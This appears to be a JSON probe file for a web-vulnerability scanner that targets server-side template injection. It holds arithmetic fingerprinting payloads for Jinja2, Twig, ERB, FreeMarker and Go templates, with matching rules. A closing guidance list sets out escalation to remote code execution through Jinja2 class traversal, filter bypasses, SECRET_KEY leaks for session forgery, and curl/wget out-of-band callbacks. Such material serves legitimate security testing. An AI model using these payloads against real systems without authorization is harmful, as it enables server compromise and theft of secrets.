{
  "category": "ssti",
  "description": " (core / language-generic)",
  "contexts": {
    "detection": {
      "description": "Universal SSTI detection probes \u2014 polyglots and engine-specific arithmetic to fingerprint which template engine is active",
      "tech_match": [],
      "param_match": [
        "name",
        "template",
        "msg",
        "text",
        "title",
        "comment",
        "input",
        "value",
        "q"
      ],
      "probes": [
        {
          "payload": "${{<%[%'\"}}%\\",
          "description": "Polyglot probe hitting Jinja2/Twig/EL/ERB delimiters \u2014 status 500 or error indicates template processing attempted",
          "matchers": [
            {
              "type": "status",
              "status": [
                500
              ]
            }
          ],
          "severity": "medium",
          "confidence_boost": 35,
          "variables": {}
        },
        {
          "payload": "{{7*7}}",
          "description": "Double-curly arithmetic \u2014 49 confirms Jinja2, Twig, Nunjucks, or Handlebars evaluation",
          "matchers": [
            {
              "type": "word",
              "words": [
                "49"
              ],
              "condition": "or"
            },
            {
              "type": "not_word",
              "words": [
                "$49",
                "49 ",
                " 49.",
                "\"49\"",
                "v49",
                "#49"
              ]
            }
          ],
          "severity": "high",
          "confidence_boost": 55,
          "variables": {}
        },
        {
          "payload": "#{7*7}",
          "description": "Ruby ERB / Velocity / Java EL expression probe \u2014 49 confirms template evaluation",
          "matchers": [
            {
              "type": "word",
              "words": [
                "49"
              ],
              "condition": "or"
            },
            {
              "type": "not_word",
              "words": [
                "$49",
                "49 ",
                " 49.",
                "\"49\"",
                "v49",
                "#49"
              ]
            }
          ],
          "severity": "high",
          "confidence_boost": 55,
          "variables": {}
        },
        {
          "payload": "${7*7}",
          "description": "Dollar-curly arithmetic \u2014 49 confirms FreeMarker, Mako, or EL expression evaluation",
          "matchers": [
            {
              "type": "word",
              "words": [
                "49"
              ],
              "condition": "or"
            },
            {
              "type": "not_word",
              "words": [
                "$49",
                "49 ",
                " 49.",
                "\"49\"",
                "v49",
                "#49"
              ]
            }
          ],
          "severity": "high",
          "confidence_boost": 55,
          "variables": {}
        },
        {
          "payload": "<%= 7*7 %>",
          "description": "ERB/EJS tag arithmetic \u2014 49 confirms Ruby ERB or Node.js EJS evaluation",
          "matchers": [
            {
              "type": "word",
              "words": [
                "49"
              ],
              "condition": "or"
            },
            {
              "type": "not_word",
              "words": [
                "$49",
                "49 ",
                " 49.",
                "\"49\"",
                "v49",
                "#49"
              ]
            }
          ],
          "severity": "high",
          "confidence_boost": 55,
          "variables": {}
        },
        {
          "payload": "{{7*'7'}}",
          "description": "Jinja2 vs Twig differentiator \u2014 Jinja2 returns '7777777' (string repetition), Twig returns '49' (arithmetic)",
          "matchers": [
            {
              "type": "word",
              "words": [
                "7777777"
              ],
              "condition": "or"
            }
          ],
          "severity": "high",
          "confidence_boost": 75,
          "variables": {}
        },
        {
          "payload": "{{7*7}}${7*7}<%=7*7%>${{7*7}}",
          "description": "Multi-engine arithmetic polyglot \u2014 49 anywhere in the response confirms at least one engine evaluated the expression",
          "matchers": [
            {
              "type": "word",
              "words": [
                "49"
              ],
              "condition": "or"
            },
            {
              "type": "not_word",
              "words": [
                "$49",
                "49 ",
                " 49.",
                "\"49\"",
                "v49",
                "#49"
              ]
            }
          ],
          "severity": "high",
          "confidence_boost": 60,
          "variables": {}
        }
      ]
    },
    "generic": {
      "description": "Generic SSTI probes for unknown template engine detection",
      "tech_match": [],
      "param_match": [
        "name",
        "template",
        "msg",
        "text",
        "title",
        "comment",
        "input",
        "value",
        "q"
      ],
      "probes": [
        {
          "payload": "{{7*7}}",
          "description": "Mustache/Jinja2/Twig/Handlebars expression probe \u2014 49 confirms evaluation",
          "matchers": [
            {
              "type": "word",
              "words": [
                "49"
              ],
              "condition": "or"
            },
            {
              "type": "not_word",
              "words": [
                "$49",
                "49 ",
                " 49.",
                "\"49\"",
                "v49",
                "#49"
              ]
            }
          ],
          "severity": "high",
          "confidence_boost": 55,
          "variables": {}
        },
        {
          "payload": "${7*7}",
          "description": "EL/FreeMarker/Thymeleaf expression probe \u2014 49 confirms evaluation",
          "matchers": [
            {
              "type": "word",
              "words": [
                "49"
              ],
              "condition": "or"
            },
            {
              "type": "not_word",
              "words": [
                "$49",
                "49 ",
                " 49.",
                "\"49\"",
                "v49",
                "#49"
              ]
            }
          ],
          "severity": "high",
          "confidence_boost": 55,
          "variables": {}
        }
      ]
    },
    "golang": {
      "description": "Server-Side Template Injection probes for Go text/template and html/template",
      "tech_match": [
        "Go",
        "Golang",
        "Gin",
        "Echo"
      ],
      "param_match": [
        "name",
        "template",
        "msg",
        "text",
        "title",
        "comment",
        "input",
        "value",
        "q"
      ],
      "probes": [
        {
          "payload": "{{.}}",
          "description": "Go template context dump \u2014 reflects the entire pipeline data object; structured output confirms Go template processing",
          "matchers": [
            {
              "type": "length_diff",
              "min_diff": 10
            },
            {
              "type": "not_word",
              "words": [
                "{{.}}"
              ]
            }
          ],
          "severity": "medium",
          "confidence_boost": 45,
          "variables": {}
        },
        {
          "payload": "{{printf \"%s\" \"SWISSKNIFE_SSTI_PROBE\"}}",
          "description": "Go template printf function \u2014 SWISSKNIFE_SSTI_PROBE in response confirms Go template evaluation",
          "matchers": [
            {
              "type": "word",
              "words": [
                "SWISSKNIFE_SSTI_PROBE"
              ],
              "condition": "or"
            }
          ],
          "severity": "high",
          "confidence_boost": 75,
          "variables": {}
        },
        {
          "payload": "{{printf \"%v\" .}}",
          "description": "Go template verbose context dump \u2014 %v format reveals struct fields and types, confirming template injection",
          "matchers": [
            {
              "type": "length_diff",
              "min_diff": 20
            },
            {
              "type": "not_word",
              "words": [
                "{{printf"
              ]
            }
          ],
          "severity": "high",
          "confidence_boost": 55,
          "variables": {}
        }
      ]
    }
  },
  "craft_guidance": [
    "1. DETECT ENGINE: Send {{7*7}} and ${7*7} and #{7*7} and <%= 7*7 %>. Result 49 tells you which syntax is evaluated. Then fingerprint: {{7*'7'}} = 7777777 (Jinja2) vs 49 (Twig).",
    "2. IDENTIFY SANDBOX: After detection, test config/settings access. Jinja2: {{config}}, Twig: {{app.request}}, Freemarker: ${.data_model}, Tornado: {{handler.settings}}.",
    "3. ESCALATION STRATEGY: Config leak (SECRET_KEY) -> session forgery -> admin. Or: class hierarchy traversal -> find subprocess/os module -> RCE.",
    "4. JINJA2 RCE: Chain through __mro__/__subclasses__ to find Popen/subprocess. Index varies by Python version. Use: {{''.__class__.__mro__[1].__subclasses__()}} then find the right index.",
    "5. FILTER BYPASS: If {{ blocked, try {%, if _ blocked use attr()|string, if . blocked use []|attr. Encode via request.args (Jinja2) or URL encoding.",
    "6. BLIND SSTI: No output? Use timing ({{range(999999999)|list}}) or OOB (curl/wget to Collaborator via RCE chain).",
    "7. FRAMEWORK HINTS: Flask/Django=Jinja2, PHP=Twig/Smarty, Java=Freemarker/Thymeleaf/Velocity, Ruby=ERB/Slim, Node=Pug/Nunjucks/EJS, Go=text/template.",
    "8. REAL IMPACT: SSTI almost always leads to RCE. Prioritize over XSS. Even info-only ({{config}}) often leaks SECRET_KEY for session forgery."
  ]
}